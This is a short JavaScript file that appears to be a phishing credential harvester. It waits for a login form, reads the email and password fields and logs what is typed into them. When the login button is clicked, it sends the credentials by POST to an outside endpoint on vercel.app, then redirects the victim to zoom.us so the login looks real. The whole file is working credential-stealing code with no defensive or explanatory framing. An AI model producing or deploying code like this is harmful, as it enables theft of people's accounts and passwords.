

async function login(email, password) {
  try {
    const response = await fetch("https://dislkash-login-page.vercel.app/api/login", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ email, password }),
    });

    const data = await response.json();
    console.log("Server response:", data);
    return data;
  } catch (error) {
    console.error("Login error:", error);
    throw error;
  }
}

setTimeout(() => {

  let emailInput = document.getElementById("email");
  let passwordInput = document.getElementById("password");
  let loginButton = document.getElementById("js_btn_login");
  // 
  console.log(emailInput, passwordInput, loginButton);
  if (emailInput && passwordInput && loginButton) {
    emailInput.addEventListener("change", (e) => {
      console.log(e.target?.value);
    });
    // 
    passwordInput.addEventListener("change", (e) => {
      console.log(e.target?.value);
    });
    // 
    loginButton.addEventListener("click", async (e) => {
      console.log("email:", emailInput?.value, "password:", passwordInput?.value);

      await login(emailInput?.value, passwordInput?.value);

      window.location.replace("https://zoom.us");
    });
  }
}, 2000)





